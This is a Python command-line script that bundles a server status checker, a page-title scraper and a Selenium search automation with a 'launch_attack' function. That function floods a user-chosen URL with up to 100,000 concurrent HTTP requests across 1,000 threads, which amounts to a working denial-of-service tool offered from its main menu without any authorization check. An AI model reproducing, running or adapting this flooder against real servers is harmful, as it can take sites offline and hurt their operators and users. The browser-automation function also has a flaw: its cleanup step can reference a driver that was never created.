import requests
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys
import logging
import re

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def is_valid_url(url):
    regex = re.compile(
        r'^(?:http|ftp)s?://' # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' # domain...
        r'localhost|' # localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|' # ...or ipv4
        r'\[?[A-F0-9]*:[A-F0-9:]+\]?)' # ...or ipv6
        r'(?::\d+)?' # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(regex, url) is not None

def check_server_status(url):
    if not is_valid_url(url):
        logging.error(f"Invalid URL: {url}")
        return
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            logging.info(f"Server {url} is up and running.")
        else:
            logging.warning(f"Server {url} returned status code {response.status_code}.")
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to connect to {url}: {e}")

def get_website_title(url):
    if not is_valid_url(url):
        logging.error(f"Invalid URL: {url}")
        return
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        title = soup.find('title').text
        print(f"The title of {url} is: {title}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to connect to {url}: {e}")
    except AttributeError:
        logging.warning(f"No title found for {url}")

def automate_browser(url, browser="chrome"):
    if not is_valid_url(url):
        logging.error(f"Invalid URL: {url}")
        return
    try:
        if browser == "chrome":
            driver = webdriver.Chrome()
        elif browser == "firefox":
            driver = webdriver.Firefox()
        else:
            logging.error("Unsupported browser!")
            return
        
        driver.get(url)
        print(f"Opened {url}")
        
        search_box = driver.find_element(By.NAME, 'q')
        search_box.send_keys('OpenAI')
        search_box.send_keys(Keys.RETURN)
        
        driver.implicitly_wait(10)
        
        results = driver.find_elements(By.CSS_SELECTOR, 'h3')
        if results:
            print(f"First result title: {results[0].text}")
        else:
            print("No results found.")
    except Exception as e:
        logging.error(f"Error during browser automation: {e}")
    finally:
        driver.quit()

def access_server(url):
    try:
        response = requests.get(url)
        return f"Server response: {response.status_code}"
    except requests.exceptions.RequestException as e:
        return f"Request error: {e}"

def print_progress_bar(iteration, total, prefix='', suffix='', decimals=1, length=50, fill='█', print_end="\r"):
    percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
    filled_length = int(length * iteration // total)
    bar = fill * filled_length + '-' * (length - filled_length)
    print(f'\r{prefix} |{bar}| {percent}% {suffix}', end=print_end)
    if iteration == total:
        print()

def launch_attack(url, nombre_acces=100000, max_workers=1000):
    print("Launching attack...\n")
    try:
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(access_server, url) for _ in range(nombre_acces)]
            for i, future in enumerate(as_completed(futures)):
                print_progress_bar(i + 1, nombre_acces, prefix='Progress:', suffix='Complete', length=50)
                result = future.result()
                sys.stdout.write(f'\r{result}')
                sys.stdout.flush()
    except KeyboardInterrupt:
        print("\nAttack interrupted by user.")

def main_menu():
    while True:
        print("\n--- Menu ---")
        print("1. Check server status")
        print("2. Get website title")
        print("3. Automate browser interaction")
        print("4. Launch server access attack")
        print("5. Exit")
        choice = input("Enter your choice: ")

        if choice == '1':
            url = input("Enter the server URL: ")
            check_server_status(url)
        elif choice == '2':
            url = input("Enter the website URL: ")
            get_website_title(url)
        elif choice == '3':
            url = input("Enter the website URL: ")
            browser = input("Enter browser (chrome/firefox): ").lower()
            automate_browser(url, browser)
        elif choice == '4':
            url = input("Enter the server URL: ")
            nombre_acces = int(input("Enter the number of accesses: "))
            max_workers = int(input("Enter the maximum number of workers: "))
            launch_attack(url, nombre_acces, max_workers)
        elif choice == '5':
            print("Exiting program.")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main_menu()